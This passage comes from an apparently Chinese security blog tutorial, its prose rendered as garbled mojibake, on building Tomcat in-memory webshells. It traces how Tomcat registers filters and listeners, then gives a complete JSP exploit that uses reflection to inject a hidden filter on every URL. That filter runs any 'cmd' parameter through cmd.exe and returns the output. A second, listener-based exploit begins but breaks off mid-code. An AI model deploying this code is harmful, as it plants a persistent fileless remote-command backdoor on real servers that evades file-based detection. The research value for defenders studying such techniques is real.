è¿›å»å³å¯</p><p><strong>äº†è§£ä¸€ä¸‹æœ‰å…³filterçš„å„ä¸ªåè¯</strong></p><ul><li>FilterDefsï¼šé¦–å…ˆï¼Œéœ€è¦å®šä¹‰è¿‡æ»¤å™¨FilterDefï¼Œå­˜æ”¾è¿™äº›FilterDefçš„æ•°ç»„è¢«ç§°ä¸ºFilterDefsï¼Œæ¯ä¸ªFilterDefå®šä¹‰äº†ä¸€ä¸ªå…·ä½“çš„è¿‡æ»¤å™¨ï¼ŒåŒ…æ‹¬æè¿°ä¿¡æ¯ã€åç§°ã€è¿‡æ»¤å™¨å®ä¾‹ä»¥åŠclassç­‰ã€‚</li><li>FilterConfigsï¼šæ˜¯è¿™äº›è¿‡æ»¤å™¨çš„å…·ä½“é…ç½®å®ä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæ¯ä¸ªè¿‡æ»¤å™¨å®šä¹‰å…·ä½“çš„é…ç½®å‚æ•°ï¼Œä»¥æ»¡è¶³ç³»ç»Ÿçš„éœ€æ±‚ã€‚</li><li>FilterMapsï¼šç”¨äºå°†FilterConfigsæ˜ å°„åˆ°å…·ä½“çš„è¯·æ±‚è·¯å¾„æˆ–å…¶ä»–æ ‡è¯†ä¸Šï¼Œè¿™æ ·ç³»ç»Ÿåœ¨å¤„ç†è¯·æ±‚æ—¶å°±èƒ½å¤Ÿæ ¹æ®è¯·æ±‚çš„è·¯å¾„æˆ–æ ‡è¯†æ‰¾åˆ°å¯¹åº”çš„FilterConfigsã€‚</li><li>FilterChainï¼šæ˜¯ç”±å¤šä¸ªFilterConfigsç»„æˆçš„é“¾å¼ç»“æ„ï¼Œå®ƒå®šä¹‰äº†è¿‡æ»¤å™¨çš„æ‰§è¡Œé¡ºåºï¼Œåœ¨å¤„ç†è¯·æ±‚æ—¶ç³»ç»Ÿä¼šæŒ‰ç…§FilterChainä¸­çš„é¡ºåºä¾æ¬¡æ‰§è¡Œæ¯ä¸ªè¿‡æ»¤å™¨ï¼Œå¯¹è¯·æ±‚è¿›è¡Œè¿‡æ»¤å’Œå¤„ç†ã€‚</li></ul><p><strong>è®¿é—®ç½‘é¡µå‰çš„filteræ·»åŠ </strong></p><p>åŒæ ·çš„filterçš„æ·»åŠ ä¹Ÿåœ¨æˆ‘ä»¬ä¹‹å‰è¯´åˆ°çš„ContextConfig#configureContexté‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202409161922576.png" alt="image-20240916192256483"></p><p>è¿™é‡Œå¾€contexté‡Œé¢æ·»åŠ filterdefï¼Œå…·ä½“ä»£ç å¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409161924392.png" alt="image-20240916192439333"></p><p>æ·»åŠ åˆ°ä¸€ä¸ªhashMapé‡Œé¢ï¼Œä¸‹é¢æ˜¯filterDefçš„ç›¸å…³å±æ€§</p><p><img src="https://cdn.clown2024.cn/202409192131516.png" alt="image-20240919213120425"></p><p>æœ‰äº›å±æ€§æ˜¯æˆ‘ä»¬åˆ°æ—¶å€™åˆ›å»ºçš„æ—¶å€™éœ€è¦è®¾ç½®çš„</p><p><img src="https://cdn.clown2024.cn/202409161925478.png" alt="image-20240916192510416"></p><p>è¿™é‡Œæ˜¯æ·»åŠ filterMapè¿›å»ï¼Œå†çœ‹ä¸€ä¸‹filterMapé‡Œç›¸å…³çš„å±æ€§</p><p><img src="https://cdn.clown2024.cn/202409192133213.png" alt="image-20240919213313122"></p><p>è¿™å°±æ˜¯è®¿é—®è·¯ç”±å‰çš„æ³¨å†Œå†…å®¹</p><p><strong>è®¿é—®ä¹‹å</strong></p><p>ç°åœ¨æˆ‘ä»¬å†™ä¸€ä¸ªfilterç±»ï¼Œç„¶åæ–­åœ¨doFilteræ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹æ‰§è¡Œçš„è¿‡ç¨‹</p><blockquote><p>è¿™é‡Œçš„chain.doFilteræ˜¯ä¸€å®šè¦å†™çš„ä¸ç„¶å°±èµ°ä¸åˆ°servleté‚£é‡Œäº†ï¼Œå› ä¸ºéå†doFilterä¹‹åï¼Œæœ€ç»ˆæ˜¯åœ¨servletService()æ–¹æ³•ä¸­èµ°åˆ°request</p></blockquote><p><img src="https://cdn.clown2024.cn/202409192135120.png" alt="image-20240919213506978"></p><p>è§‚å¯Ÿä¸€ä¸‹ä»–çš„è°ƒç”¨æ ˆï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä»StandardWrapperValve#invokeè¿‡æ¥çš„ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409170050633.png" alt="image-20240917005012554"></p><p>æ‰€ä»¥å¯ä»¥çŸ¥é“æ˜¯åœ¨filterChainçš„doFilteræ–¹æ³•é‡Œé¢æ‰§è¡Œæˆ‘ä»¬çš„filterå’Œservlet</p><p>ç„¶ååœ¨æ‰¾ä¸€ä¸‹filterChainæ˜¯åœ¨å“ªåˆ›å»ºçš„</p><p><img src="https://cdn.clown2024.cn/202409170052061.png" alt="image-20240917005252976"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯åœ¨è¿™é‡Œï¼Œæ¥ä¸‹æ¥é‡æ–°ä¸‹æ–­ç‚¹åˆ°è¿™ï¼Œçœ‹ä¸€ä¸‹filterChainçš„åˆ›å»º</p><p><img src="https://cdn.clown2024.cn/202409192140374.png" alt="image-20240919214048265"></p><p>è¿™é‡Œå…ˆåˆ›å»ºäº†ä¸€ä¸ªApplicationFilterChainç„¶åçœ‹èƒ½å¦ä»reqä¸­è·å–filterChainï¼Œä¸èƒ½å°±æ–°å»ºä¸€ä¸ªApplicationFilterChainåŒæ—¶setç»™reqï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409170101254.png" alt="image-20240917010128142"></p><p>ç„¶åå°±æ˜¯è·å–standardContextå†ä»ä¸­è·å–filterMapsï¼Œç„¶åçœ‹ä¸€ä¸‹ç°åœ¨filterMapsé‡Œé¢çš„å†…å®¹</p><p><img src="https://cdn.clown2024.cn/202409192144379.png" alt="image-20240919214407244"></p><p>å¯ä»¥çœ‹åˆ°æœ‰æœ‰æˆ‘ä»¬è‡ªå·±çš„é‚£ä¸ªFilterMap</p><p><img src="https://cdn.clown2024.cn/202409170106138.png" alt="image-20240917010647039"></p><p>æ¥ä¸‹æ¥ä¼šéå†filterMaps ä¸­çš„ filterMapçš„filterNameï¼Œå¦‚æœå‘ç°ç¬¦åˆå½“å‰è¯·æ±‚ url ä¸ filterMap ä¸­çš„ urlPattern åŒ¹é…ä¸”é€šè¿‡filterNameèƒ½æ‰¾åˆ°å¯¹åº”çš„filterConfigï¼Œåˆ™ä¼šå°†å…¶åŠ å…¥filterChain</p><p>é‚£æ¥çœ‹ä¸€ä¸‹ApplicationFilterConfigçš„åˆ›å»º</p><p><img src="https://cdn.clown2024.cn/202409192148887.png" alt="image-20240919214844764"></p><p>å¯ä»¥çœ‹åˆ°ä»StandardContextçš„filterConfigsé‡Œé¢ç›´æ¥æ ¹æ®keyè·å–ApplicationFilterConfigçš„å®ä¾‹</p><p>æœ€åçœ‹ä¸€ä¸‹filterConfigçš„å†…å®¹</p><p><img src="https://cdn.clown2024.cn/202409192151525.png" alt="image-20240919215145392"></p><p>åŒ…å«äº†filterå®ä¾‹å’ŒfilterDefè¿˜æœ‰contextè¿™å‡ ä¸ªé‡è¦å…ƒç´ ï¼Œåˆ°æ­¤filterChainåˆ›å»ºå®Œæˆï¼Œç„¶åå°±æ˜¯æ‰§è¡Œå‰é¢è¯´çš„çš„doFilteræ–¹æ³•</p><h2 id="å†…å­˜é©¬ç¼–å†™"><a href="#å†…å­˜é©¬ç¼–å†™" class="headerlink" title="å†…å­˜é©¬ç¼–å†™"></a>å†…å­˜é©¬ç¼–å†™</h2><p>å‰é¢åˆ†æå¯çŸ¥ï¼Œæœ€é‡è¦çš„ä¸¤ä¸ªæ–¹æ³•æ˜¯**StandardContext.findFilterMaps()<strong>å’Œ</strong>StandardContext.findFilterConfig()**ï¼Œæˆ‘ä»¬åªè¦å¾€è¿™2ä¸ªå±æ€§é‡Œé¢æ’å…¥å¯¹åº”çš„filterMapå’ŒfilterConfigå³å¯å®ç°åŠ¨æ€æ·»åŠ filterçš„ç›®çš„ï¼Œè¿™äº›å±æ€§éƒ½åœ¨standardContexté‡Œé¢ï¼Œé‚£ä¹ˆstandardContexté‡Œé¢æ˜¯å¦ä¹Ÿæœ‰æ·»åŠ è¿™äº›å±æ€§çš„æ–¹æ³•å‘¢</p><p>è¿™é‡ŒstandardContextæä¾›äº†æ·»åŠ filterMapçš„æ–¹æ³•<strong>addFilterMapBefore</strong></p><p><img src="https://cdn.clown2024.cn/202409170136347.png" alt="image-20240917013619268"></p><p>è¿™é‡Œä¼šå…ˆæ ¡éªŒï¼Œç„¶åå†æ·»åŠ filterMapï¼Œè·Ÿè¿›ä¸€ä¸‹validateFilterMapæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409170138616.png" alt="image-20240917013804538"></p><p>å¯ä»¥çœ‹åˆ°å®ƒä¼šæ ¹æ®filterNameå»å¯»æ‰¾å¯¹åº”çš„filterDefï¼Œå¦‚æœæ²¡æ‰¾åˆ°çš„è¯ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¿˜éœ€è¦å¾€filterDefsé‡Œæ·»åŠ filterDefã€‚</p><p>å…³äºfilterDefsï¼ŒStandardContextä¹Ÿç›´æ¥æä¾›äº†å¯¹åº”çš„æ·»åŠ æ–¹æ³•addFilterDef</p><p><img src="https://cdn.clown2024.cn/202409170140748.png" alt="image-20240917014031687"></p><p>æœ€åfilterConfigå¹¶æ²¡æœ‰æ·»åŠ è¯¥å±æ€§çš„æ–¹æ³•ï¼Œéœ€è¦æˆ‘ä»¬é€šè¿‡åå°„è·å–å±æ€§è¿›è¡Œä¿®æ”¹</p><p><img src="https://cdn.clown2024.cn/202409170142816.png" alt="image-20240917014218759"></p><p>ç°åœ¨å¤§éƒ¨åˆ†çš„é—®é¢˜æˆ‘ä»¬éƒ½è§£å†³äº†</p><p>ä¸‹é¢æ˜¯å…·ä½“çš„ä»£ç å®ç°</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br><br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">// è·å–StandardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br><br>    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªfilterå®ä¾‹</span><br>    Filter evilFilter=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/C&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                <span class="hljs-comment">//å°†å‘½ä»¤å›æ˜¾å†™å…¥åˆ°responseé‡Œé¢å»</span><br>                response.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len));<br>                process.destroy();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">//å»æ‰§è¡ŒdoFilteræ–¹æ³•</span><br>            chain.doFilter(request,response);<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">// FilterDef</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterDef.setFilterClass(evilFilter.getClass().getName());<br>    <span class="hljs-comment">//è¿™é‡Œä¼°è®¡ä¹Ÿæ˜¯åœ¨å®ä¾‹åŒ–filterçš„æ—¶å€™å¦‚æœfilterDefè®¾ç½®äº†å°±ç›´æ¥è¿”å›filterï¼Œå› ä¸ºè°ƒè¯•çš„æ—¶å€™filterDefé‡Œé¢æ­£å¸¸ä¹Ÿæ˜¯æ²¡æœ‰filterå®ä¾‹çš„</span><br>    filterDef.setFilter(evilFilter);<br>    <span class="hljs-comment">//æ·»åŠ FilterDef</span><br>    standardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">// FilterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    <span class="hljs-comment">//æ·»åŠ FilterMap</span><br>    standardContext.addFilterMapBefore(filterMap);<br><br>    <span class="hljs-comment">// è·å–filterConfigs</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-comment">//åˆ›å»ºApplicationFilterConfig</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<span class="hljs-comment">//å°†contextå’ŒfilterDefæ·»åŠ è¿›å»</span><br>    filterConfigs.put(<span class="hljs-string">&quot;clown&quot;</span>,filterConfig);<br><br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br><br><br><br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409170203799.png" alt="image-20240917020309726"></p><p><img src="https://cdn.clown2024.cn/202409192246438.png" alt="image-20240919224412807"></p><p>æˆåŠŸï¼</p><blockquote><p>è¿˜æœ‰expä¸­çš„è¿™è¡Œä»£ç filterMap.setDispatcher(DispatcherType.REQUEST.name());</p><p>æˆ‘æœäº†ä¸€ä¸‹å®ƒæ˜¯å®šä¹‰äº†è¿‡æ»¤å™¨å¯ä»¥ä»‹å…¥çš„å‡ ç§è¯·æ±‚ç±»å‹ã€‚è¿™äº›ç±»å‹åŒ…æ‹¬ï¼š</p><ul><li><code>REQUEST</code>ï¼šæ™®é€šçš„å®¢æˆ·ç«¯è¯·æ±‚ã€‚</li><li><code>FORWARD</code>ï¼šé€šè¿‡ <code>RequestDispatcher</code> è½¬å‘çš„è¯·æ±‚ã€‚</li><li><code>INCLUDE</code>ï¼šé€šè¿‡ JSP åŒ…å«æŒ‡ä»¤åŒ…å«çš„èµ„æºã€‚</li><li><code>ERROR</code>ï¼šä½œä¸ºé”™è¯¯é¡µé¢è¯·æ±‚ã€‚</li></ul><p>æ‰€ä»¥è¿™è¡Œä»£ç ä¸æ˜¯å¿…é¡»çš„ï¼Œåˆ æ‰ä¹Ÿä¸€æ ·å¯ä»¥</p><p>è€Œä¸”è¿™è¡Œä»£ç åªæ”¯æŒTomcat 7.x ä»¥ä¸Šï¼Œå› ä¸ºjavax.servlet.DispatcherType ç±»æ˜¯servlet 3 ä»¥åå¼•å…¥ï¼Œè€Œ Tomcat 7ä»¥ä¸Šæ‰æ”¯æŒ Servlet 3</p></blockquote><h1 id="listenerå†…å­˜é©¬"><a href="#Listenerå†…å­˜é©¬" class="headerlink" title="Listenerå†…å­˜é©¬"></a>Listenerå†…å­˜é©¬</h1><p>listenerå°±æ˜¯äº‹ä»¶ç›‘å¬ï¼Œjavaæœ‰å¾ˆå¤šä¸­listener</p><p><img src="https://cdn.clown2024.cn/202409182314209.png" alt="image-20240918230547084"></p><p>å¤§éƒ½æ˜¯ç»§æ‰¿è‡ªEventListeneræ¥å£ï¼Œè¿™é‡Œç”¨ServletRequestListenerï¼Œä»–æœ‰ä¸‹é¢çš„ä¸¤ä¸ªæ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.void requestInitialized(ServletRequestEvent sre)ï¼š<br>è¿™ä¸ªæ–¹æ³•åœ¨ Servlet è¯·æ±‚å¯¹è±¡è¢«åˆ›å»ºå¹¶ä¸”è¿˜æ²¡æœ‰è¢«ä½¿ç”¨ä¹‹å‰è¢«è°ƒç”¨ã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨ä¸€ä¸ª HTTP è¯·æ±‚åˆ°è¾¾ Servlet å®¹å™¨ï¼Œå¹¶ä¸”å®¹å™¨å†³å®šä¸ºè¯¥è¯·æ±‚åˆ›å»ºä¸€ä¸ªæ–°çš„ ServletRequest å¯¹è±¡æ—¶ã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥ç”¨æ¥åˆå§‹åŒ–è¯·æ±‚ç›¸å…³çš„èµ„æºï¼Œæ¯”å¦‚è®¾ç½®è¯·æ±‚å±æ€§æˆ–è€…å¯åŠ¨è·Ÿè¸ªè¯·æ±‚çŠ¶æ€çš„é€»è¾‘ã€‚<br><br>2.void requestDestroyed(ServletRequestEvent sre)ï¼š<br>è¿™ä¸ªæ–¹æ³•åœ¨ Servlet è¯·æ±‚å¯¹è±¡å³å°†è¢«é”€æ¯æ—¶è¢«è°ƒç”¨ã€‚è¿™é€šå¸¸å‘ç”Ÿåœ¨è¯·æ±‚å¤„ç†å®Œæˆï¼Œå“åº”å·²ç»å‘é€ç»™å®¢æˆ·ç«¯ä¹‹åã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥ç”¨æ¥æ¸…ç†è¯·æ±‚ç›¸å…³çš„èµ„æºï¼Œæ¯”å¦‚å…³é—­æ•°æ®åº“è¿æ¥æˆ–è€…æ¸…ç†åœ¨ requestInitialized æ–¹æ³•ä¸­åˆ›å»ºçš„ä»»ä½•å¯¹è±¡ã€‚<br></code></pre></td></tr></table></figure><p>å¯ä»¥å†™ä¸€ä¸ªç®€å•çš„demoæµ‹è¯•ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servletshell;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListenerTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Listener è°ƒç”¨&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;servlet ç¦»å¼€&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é…ç½®web.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.clown.servletshell.ListenerTest<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h2><p>æ¥ä¸‹æ¥å°±æ˜¯ç…§å¸¸åˆ†æä¸€ä¸‹Listeneræ˜¯æ€ä¹ˆæ³¨å†Œçš„äº†</p><p>è¿™é‡Œç›´æ¥ä»<strong>ContextConfig#configureContext</strong>é‚£é‡Œå¼€å§‹åˆ†æï¼Œä¹Ÿå°±æ˜¯è®¿é—®å‰çš„è¿‡ç¨‹</p><p>é‚£å°±å†å»è¯»å–web.xmlçš„é‚£ä¸ªåœ°æ–¹çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/202409191119893.png" alt="image-20240919111941724"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œåœ¨æ·»åŠ filterä¹‹åå°±å°†listenerçš„å…¨ç±»åè¿›è¡Œæ·»åŠ ï¼Œè°ƒç”¨StandardContext#addApplicationListeneræ–¹æ³•</p><p>æ·»åŠ ä¹‹åä»–ä¼šè°ƒç”¨StandardContext#listenerStart</p><p><img src="https://cdn.clown2024.cn/202409191139786.png" alt="image-20240919113903688"></p><p>ç„¶åè¿™é‡Œä¼šæŸ¥æ‰¾æˆ‘ä»¬æ·»åŠ çš„listenerï¼Œåˆ°è¿™æ­¥çš„ä»£ç æ¯”è¾ƒå¤æ‚å°±ä¸è°ƒäº†ï¼Œæœ‰ä¸ªæ•°å°±è¡Œ</p><p><strong>ç„¶åæˆ‘ä»¬å»è®¿é—®ç½‘é¡µ</strong>ï¼Œçœ‹ä¸€ä¸‹è¯·æ±‚è¿‡æ¥æ—¶listeneråœ¨å“ªé‡Œè°ƒç”¨çš„</p><p><img src="https://cdn.clown2024.cn/202409191143445.png" alt="image-20240919114327349"></p><p>è¿™é‡Œä¸‹ä¸ªæ–­ç‚¹ç„¶åçœ‹çœ‹è°ƒç”¨æ ˆï¼Œçœ‹å“ªä¸€ä¸ªå‡½æ•°æœ€é‡è¦</p><p><img src="https://cdn.clown2024.cn/202409191144058.png" alt="image-20240919114444926"></p><p>æœ€é‡è¦çš„åº”è¯¥æ˜¯è¿™ä¸ªå‡½æ•°StandardContext#fireRequestInitEvent</p><p>é‡æ–°å°†æ–­ç‚¹ä¸‹åœ¨è¿™é‡Œçœ‹ä¸€çœ‹</p><p><img src="https://cdn.clown2024.cn/202409191151789.png" alt="image-20240919115146689"></p><p>å¯ä»¥çœ‹åˆ°å®ƒæ¥å—äº†requestè¯·æ±‚å‚æ•°ç„¶åè¿›è¡Œç›¸å…³æ“ä½œï¼Œç„¶åè¿™é‡Œè·å–ä¸€ä¸ªlisteneræ•°ç»„</p><p>æˆ‘ä»¬è¿›è¯¥æ–¹æ³•çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/202409191155718.png" alt="image-20240919115507610"></p><p>å¯ä»¥çœ‹åˆ°applicationEventListenersListé‡Œé¢çš„å°±æ˜¯æˆ‘ä»¬çš„listener</p><p>è€Œä¸”StandardContextè¿˜æœ‰å¯¹åº”çš„æ·»åŠ listenerçš„æ–¹æ³•å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202409191156621.png" alt="image-20240919115656529"></p><p>ç„¶åå°±æ˜¯åˆ°ä¸‹é¢éå†è§¦å‘æˆ‘ä»¬å®šä¹‰çš„listenerçš„requestInitialized()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409191200195.png" alt="image-20240919120033087"></p><p>åˆ°è¿™é‡Œæµç¨‹å°±ç»“æŸï¼Œè¿™éƒ¨åˆ†çœ‹èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„</p><p>ç›¸å¯¹åº”çš„è¯·æ±‚ç»“æŸçš„æ—¶å€™å°±ä¼šè°ƒç”¨fireRequestDestroyEventæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409191232040.png" alt="image-20240919120248808"></p><h2 id="å†…å­˜é©¬ç¼–å†™"><a href="#å†…å­˜é©¬ç¼–å†™-1" class="headerlink" title="å†…å­˜é©¬ç¼–å†™"></a>å†…å­˜é©¬ç¼–å†™</h2><p>é€šè¿‡ä¸Šé¢çš„æµç¨‹åˆ†æï¼Œexpçš„ç¼–å†™æ­¥éª¤ä¹Ÿå¾ˆç®€å•ï¼š</p><p>å°±æ˜¯é€šè¿‡ StandardContext ç±»çš„ <code>addApplicationEventListener()</code> æ–¹æ³•æŠŠæ¶æ„çš„ Listenerå®ä¾‹æ”¾è¿›å»ï¼Œç„¶åæ¶æ„ä»£ç å†™åœ¨requestInitialized()æ–¹æ³•é‡Œé¢å³å¯</p><p>exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//è·å–standardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field 